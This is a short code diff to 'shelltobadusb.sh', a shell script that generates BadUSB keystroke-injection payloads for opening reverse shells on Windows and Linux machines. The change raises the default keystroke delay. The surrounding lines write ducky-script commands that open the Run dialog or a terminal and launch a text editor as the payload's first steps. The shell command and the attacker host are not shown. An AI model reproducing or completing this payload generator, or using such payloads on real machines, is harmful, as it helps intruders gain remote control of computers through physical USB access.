@@ -43,7 +43,7 @@ echo "Your listener command is: $listenercommand"
 if [ $osmeta == "windows" ] ; then
 	echo "REM This payload was created by shelltobadusb.sh" > revshell.txt
 	echo "REM this script sucks, and uses data from https://github.com/0dayCTF/reverse-shell-generator/blob/main/js/data.js" >> revshell.txt
-	echo "DEFAULT_DELAY 30" >> revshell.txt
+	echo "DEFAULT_DELAY 300" >> revshell.txt
 	echo "GUI r" >> revshell.txt
 	echo "STRING notepad" >> revshell.txt
 	echo "ENTER" >> revshell.txt
@@ -55,7 +55,7 @@ fi
 if [ $osmeta == "linux" ] ; then
 	echo "REM This payload was created by shelltobadusb.sh" > revshell.txt
 	echo "REM this script sucks, and uses data from https://github.com/0dayCTF/reverse-shell-generator/blob/main/js/data.js" >> revshell.txt
-	echo "DEFAULT_DELAY 30" >> revshell.txt
+	echo "DEFAULT_DELAY 300" >> revshell.txt
 	echo "CONTROL ALT t" >> revshell.txt
 	echo "DELAY 250" >> revshell.txt
 	echo "STRING mousepad" >> revshell.txt
